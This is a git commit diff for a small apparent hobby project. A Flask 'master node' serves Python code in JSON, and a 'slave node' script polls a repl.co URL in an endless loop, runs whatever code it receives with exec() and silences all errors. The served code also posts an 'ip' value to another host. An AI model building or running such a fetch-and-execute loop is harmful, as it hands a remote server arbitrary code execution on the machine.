32bd0c9355dcf0468a07de9895699821bf601a34
Yev <yevgeniybarkalov@yahoo.com>
2018-03-25 07:57:49 -0700

    some changes

--- master_node.py
+++ master_node.py
@@ -1,9 +1,16 @@
+print "Hello from Flask!"
+
 from flask import Flask, request, jsonify
 app = Flask(__name__)
 
-@app.route("/")
+
+@app.route("/", methods=["GET","POST"])
 def hello():
-    return jsonify(continue_="true",action_="print ('Hello from Yev and Zane!')")
+  if request.method == "GET":
+    return jsonify(continue_="true",action_="import requests\nr = requests.post('https://MasterNodeCool--yevbar.repl.co', json={'ip' : ''})")
+  else:
+    print request.get_json(silent=True)
+    return "Thanks!"
 
 if __name__ == "__main__":
     app.run(host= '0.0.0.0', port=9000, debug=False)
--- slave_node.py
+++ slave_node.py
@@ -1,12 +1,28 @@
-from flask import Flask, jsonify
 import requests
 import time
-
-app = Flask(__name__)
 
 current_action = ""
 proceed = True
 
+while (proceed):
+    try:
+      print "hello from inside!"
+      time.sleep(1)
+      response = requests.get("https://MasterNode--yevbar.repl.co")
+      json_data = response.json()
+      proceed = json_data["continue_"] == u'true'
+      print "hello again from inside!"
+      print proceed
+      time.sleep(2)
+      if current_action != json_data["action_"]:
+        current_action = json_data["action_"]
+      print current_action
+      exec(current_action)
+      print "did action"
+    except Exception as e:
+      two = 1 + 1
+
+"""
 @app.route("/")
 def home():
   global current_action
@@ -16,8 +32,10 @@ def home():
       response = requests.get("https://MasterNode--yevbar.repl.co")
       json_data = response.json()
       proceed = json_data["continue_"] == u'true'
+      print proceed
       if current_action != json_data["action_"]:
         current_action = json_data["action_"]
+      print current_action
       exec(current_action)
       time.sleep(2)
     except Exception as e:
@@ -26,3 +44,4 @@ def home():
   
 if __name__ == "__main__":
   app.run(host= '0.0.0.0', port=9000, debug=False)
+"""
